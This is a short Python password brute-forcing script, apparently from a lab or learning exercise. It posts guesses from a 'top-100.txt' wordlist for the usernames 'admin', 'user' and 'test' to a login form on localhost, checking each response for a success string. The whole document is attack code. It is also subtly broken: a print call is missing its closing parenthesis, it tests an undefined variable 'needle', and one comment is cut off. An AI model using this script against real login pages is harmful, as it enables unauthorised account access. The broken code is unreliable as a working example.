import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
response = "Welcome back"

#Do the following as many times as the number of username in the usernames list
for username in usernames:
  # read from the external passwords txt file and save the text inside as passwords_list
  with open(passwords, "r") as passwords_list:
    #for every password in the list of passwords_list do the followings
    for password in passwords_list:
      #stripp the 
      password = password.strip("\n").encode()
      sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode())
      sys.stdout.flush()
      r = requests.post(target, data={"username": username, "password": password})
      if needle.encode() in r.content:
        sys.stdout.write("\n")
        sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
        sys.exit()
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo password found for '{}'!".format(username))


